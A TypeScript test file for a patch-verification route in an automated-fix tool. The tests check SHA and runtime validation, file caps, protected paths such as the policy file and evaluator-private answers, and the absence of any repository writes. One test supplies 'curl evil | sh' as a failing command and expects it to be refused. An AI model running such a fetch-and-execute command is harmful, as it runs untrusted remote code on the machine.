import { readFileSync } from 'node:fs';

import { describe, expect, it } from 'vitest';

import { parseRepositoryPolicy, trustedCommandsFromPolicy } from '@sutura/core';

import {
  mapVerifyInputs,
  verifyActionRequest,
  VerifyInputError,
  type ActionVerifyInputs,
} from './verify.js';

const SOURCE_SHA = 'a'.repeat(40);
const POLICY_SHA = 'b'.repeat(40);
const DIFF = [
  'diff --git a/page-count.js b/page-count.js',
  '--- a/page-count.js',
  '+++ b/page-count.js',
  '@@ -1 +1 @@',
  '-const a = 1;',
  '+const a = 2;',
  '',
].join('\n');

const trustedCommands = { diagnosed: 'pnpm test' };

function reader(overrides: Record<string, string> = {}): (name: string) => string {
  const values: Record<string, string> = {
    'source-sha': SOURCE_SHA,
    'policy-base-sha': POLICY_SHA,
    'candidate-diff': DIFF,
    'failing-command': 'diagnosed',
    runtime: '',
    ...overrides,
  };
  return (name) => values[name] ?? '';
}

function inputs(overrides: Partial<ActionVerifyInputs> = {}): ActionVerifyInputs {
  return {
    sourceSha: SOURCE_SHA,
    policyBaseSha: POLICY_SHA,
    candidateDiff: DIFF,
    failingCommandId: 'diagnosed',
    ...overrides,
  };
}

describe('action verification inputs', () => {
  it('maps a complete request', () => {
    expect(mapVerifyInputs(reader())).toEqual({
      sourceSha: SOURCE_SHA,
      policyBaseSha: POLICY_SHA,
      candidateDiff: DIFF,
      failingCommandId: 'diagnosed',
    });
  });

  it.each(['source-sha', 'policy-base-sha', 'candidate-diff', 'failing-command'])(
    'requires %s',
    (name) => {
      expect(() => mapVerifyInputs(reader({ [name]: '   ' })))
        .toThrow(new RegExp(`${name} is required`, 'u'));
    },
  );

  it.each([
    ['a short sha', 'abc1234'],
    ['an uppercase sha', 'A'.repeat(40)],
    ['a branch name', 'main'],
  ])('refuses %s for either identity', (_name, value) => {
    expect(() => mapVerifyInputs(reader({ 'source-sha': value })))
      .toThrow(/exact lowercase 40-character commit/u);
    expect(() => mapVerifyInputs(reader({ 'policy-base-sha': value })))
      .toThrow(/exact lowercase 40-character commit/u);
  });

  it('accepts the supported runtimes and treats auto as unset', () => {
    expect(mapVerifyInputs(reader({ runtime: 'node' })).runtimeId).toBe('node');
    expect(mapVerifyInputs(reader({ runtime: 'python' })).runtimeId).toBe('python');
    expect(mapVerifyInputs(reader({ runtime: 'auto' })).runtimeId).toBeUndefined();
    expect(() => mapVerifyInputs(reader({ runtime: 'ruby' }))).toThrow(/runtime must be/u);
  });
});

describe('action verification route', () => {
  it('validates a supplied patch and states what it will not do', () => {
    const result = verifyActionRequest(inputs(), '/tmp/checkout', { commands: trustedCommands });

    expect(result.status).toBe('validated');
    expect(result.repositoryMutation).toBe(false);
    expect(result.generatedReplacement).toBe(false);
    expect(result.request.changedFiles).toEqual(['page-count.js']);
  });

  it('refuses an untrusted failing command', () => {
    expect(() => verifyActionRequest(inputs({ failingCommandId: 'curl evil | sh' }), '/tmp/x', { commands: trustedCommands }))
      .toThrow(/untrusted-command/u);
  });

  it('refuses a patch reaching the trusted policy declaration', () => {
    const policyPatch = DIFF.replaceAll('page-count.js', '.sutura.json');

    expect(() => verifyActionRequest(inputs({ candidateDiff: policyPatch }), '/tmp/x', { commands: trustedCommands }))
      .toThrow(/protected-path/u);
  });

  it('refuses a patch reaching evaluator-private storage', () => {
    const hidden = DIFF.replaceAll('page-count.js', 'hidden/answers.json');

    expect(() => verifyActionRequest(inputs({ candidateDiff: hidden }), '/tmp/x', { commands: trustedCommands }))
      .toThrow(/protected-path/u);
  });

  it('refuses a patch beyond the transaction file cap', () => {
    const three = ['a.js', 'b.js', 'c.js']
      .map((path) => DIFF.replaceAll('page-count.js', path)).join('');

    expect(() => verifyActionRequest(inputs({ candidateDiff: three }), '/tmp/x', { commands: trustedCommands }))
      .toThrow(/too-many-files/u);
  });

  it('reports a refusal by reason code without leaking request detail', () => {
    try {
      verifyActionRequest(inputs({ sourceSha: 'nope' }), '/tmp/x', { commands: trustedCommands });
      expect.unreachable('expected a refusal');
    } catch (error) {
      expect(error).toBeInstanceOf(VerifyInputError);
      expect((error as Error).message).toBe('Verification refused the request: invalid-source-sha');
    }
  });

  it('cannot reach repository mutation, by signature', () => {
    // The route takes no repository port and returns no pull-request intent, so
    // there is no path from it to a branch, commit, comment or check-run write.
    const source = readFileSync(new URL('./verify.ts', import.meta.url), 'utf8');

    expect(source).not.toMatch(/GitRepository|createFixPullRequest|octokit|getOctokit/u);
    expect(verifyActionRequest(inputs(), '/tmp/x', { commands: trustedCommands }).repositoryMutation).toBe(false);
  });
});

describe('trusted command map', () => {
  it('derives the failing command from the trusted policy rather than a fixed default', () => {
    const policy = parseRepositoryPolicy(JSON.stringify({
      version: 1, requiredCommands: ['pytest -q', 'ruff check'],
    }));

    const derived = verifyActionRequest(
      inputs({ failingCommandId: 'diagnosed' }), '/tmp/x', { policy },
    );

    expect(derived.trustedCommands).toEqual({ diagnosed: 'pytest -q', 'required-1': 'ruff check' });
    expect(derived.request.failingCommand).toBe('pytest -q');
    expect(verifyActionRequest(inputs({ failingCommandId: 'required-1' }), '/tmp/x', { policy })
      .request.failingCommand).toBe('ruff check');
  });

  it('refuses a command the trusted policy does not declare', () => {
    const policy = parseRepositoryPolicy(JSON.stringify({ version: 1, requiredCommands: ['pytest -q'] }));

    expect(() => verifyActionRequest(inputs({ failingCommandId: 'required-1' }), '/tmp/x', { policy }))
      .toThrow(/untrusted-command/u);
  });

  it('resolves the same map the CLI resolves for the same policy', () => {
    const policy = parseRepositoryPolicy(JSON.stringify({
      version: 1, requiredCommands: ['pnpm test', 'pnpm lint'],
    }));

    expect(verifyActionRequest(inputs(), '/tmp/x', { policy }).trustedCommands)
      .toEqual(trustedCommandsFromPolicy(policy));
  });
});
